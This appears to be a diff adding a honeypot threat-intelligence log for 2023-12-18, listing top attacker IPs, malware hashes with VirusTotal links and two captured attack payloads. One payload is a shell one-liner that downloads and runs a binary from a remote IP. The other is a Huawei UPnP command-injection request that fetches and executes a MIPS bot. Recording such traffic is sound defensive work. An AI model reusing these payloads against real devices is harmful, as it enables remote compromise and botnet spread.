@@ -1,0 +1,20 @@
+Top 5 IPs for 2023-12-18:
+139.59.248.243
+43.156.18.46
+43.135.172.35
+43.153.212.115
+43.156.46.179
+
+Malware seen: 
+Hash: 94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+https://www.virustotal.com/gui/file/94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+Hash: 0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257
+https://www.virustotal.com/gui/file/0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257
+Hash: 76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d98269e0469d896c29dc64
+https://www.virustotal.com/gui/file/76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d98269e0469d896c29dc64
+
+
+nohup $SHELL -c \"curl http://47.94.16.134:60148/linux -o /tmp/iVdDZoeDuI; if [ ! -f /tmp/iVdDZoeDuI ]; then wget http://47.94.16.134:60148/linux -O /tmp/iVdDZoeDuI; fi; if [ ! -f /tmp/iVdDZoeDuI ]; then exec 6<>/dev/tcp/47.94.16.134/60148 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/iVdDZoeDuI && chmod +x /tmp/iVdDZoeDuI && /tmp/iVdDZoeDuI /pOAW5VZZIbV8jVu1MhkP/XLj2Vdm1uAnYGAhZlei1p6j8zxP2vKy2w848+LelqIV5mChIedhlaCUWKOyvIyfc/UbD3x1YxlWpVeh4CJhYOGXoJLYIfV8TZv1MhsNO3JjGRRjV+GgYGTh4BBgl96j83tNG7OwGs18s+GdFqLXJmBgoqdgV+VWWaPwfU1bM7MfT3tyY9tRYJbmYKAgYmBX4paZ57K9jNzyMlvK/LLkGVTi1WBg4KHh5deg1h6i83tNGTC1Gw29cGIZFqLWZeCg4KdhlyJRWeG1fI2bcDMbTTxyp5lWYpBg4KdgoKBQY1YbojL8jZs2sttPe3KhmVFil2FnYGBgo1Zi1pkj9vyMGnUwnM0+s+QZVqNVYGDgoGEl16JW3qMzO00acPUajT5zY5lWolPhouDnYKPX5VZYIfV9zBnzMpsNvvbj21blVmGnYCHnYZZjlFijsrwMX3OyXM09s2QZ12VXoCBiYWDhl+OS2CJ1foxc8vMczTwz4RiW4pbj5OAip2GX4pFZYjJ7TRkw8BrNfLIh3RYgkGGg4SdgYNblVpni8H1NWzKyX0088qQZluKQY+BnYKDjVmLWmeO2/c8c8jJbyvxyo96WYlfjYWDgoGFT4peZpDK8DNzy8tkK/LOjm5di16HhpOChoFBiVhmkMrzK2zCymcz88qKYEuOQYaLgZ2Bhl6VWmSNwfU1bMvDfTD61Y9lW5VehISdgYaNWYtaYIvb8jxt1MxsK/DPkGVdjlWBg4KAh5deiVp6isrtNGzM1Gs2+c2OZViKT4aDgJ2BhlaVXWSQyfE0Z8zKbDH1h9eEr9lCnZiK/wod9w1ADzxxJskpYsAzZDTD2Q==; fi; echo 12345678 > /tmp/.opass; chmod +x /tmp/iVdDZoeDuI && /tmp/iVdDZoeDuI /pOAW5VZZIbV8jVu1MhkP/XLj2Vdm1uAnYGAhZlei1p6j8zxP2vKy2w848+LelqIV5mChIedhlaCUWKOyvIyfc/UbD3x1YxlWpVeh4CJhYOGXoJLYIfV8TZv1MhsNO3JjGRRjV+GgYGTh4BBgl96j83tNG7OwGs18s+GdFqLXJmBgoqdgV+VWWaPwfU1bM7MfT3tyY9tRYJbmYKAgYmBX4paZ57K9jNzyMlvK/LLkGVTi1WBg4KHh5deg1h6i83tNGTC1Gw29cGIZFqLWZeCg4KdhlyJRWeG1fI2bcDMbTTxyp5lWYpBg4KdgoKBQY1YbojL8jZs2sttPe3KhmVFil2FnYGBgo1Zi1pkj9vyMGnUwnM0+s+QZVqNVYGDgoGEl16JW3qMzO00acPUajT5zY5lWolPhouDnYKPX5VZYIfV9zBnzMpsNvvbj21blVmGnYCHnYZZjlFijsrwMX3OyXM09s2QZ12VXoCBiYWDhl+OS2CJ1foxc8vMczTwz4RiW4pbj5OAip2GX4pFZYjJ7TRkw8BrNfLIh3RYgkGGg4SdgYNblVpni8H1NWzKyX0088qQZluKQY+BnYKDjVmLWmeO2/c8c8jJbyvxyo96WYlfjYWDgoGFT4peZpDK8DNzy8tkK/LOjm5di16HhpOChoFBiVhmkMrzK2zCymcz88qKYEuOQYaLgZ2Bhl6VWmSNwfU1bMvDfTD61Y9lW5VehISdgYaNWYtaYIvb8jxt1MxsK/DPkGVdjlWBg4KAh5deiVp6isrtNGzM1Gs2+c2OZViKT4aDgJ2BhlaVXWSQyfE0Z8zKbDH1h9eEr9lCnZiK/wod9w1ADzxxJskpYsAzZDTD2Q==\" &#UPX!
+
+POST /ctrlt/DeviceUpgrade_1
+<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox wget -g 193.233.193.12 -l /tmp/.oxy -r /yeye/yeye.mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>
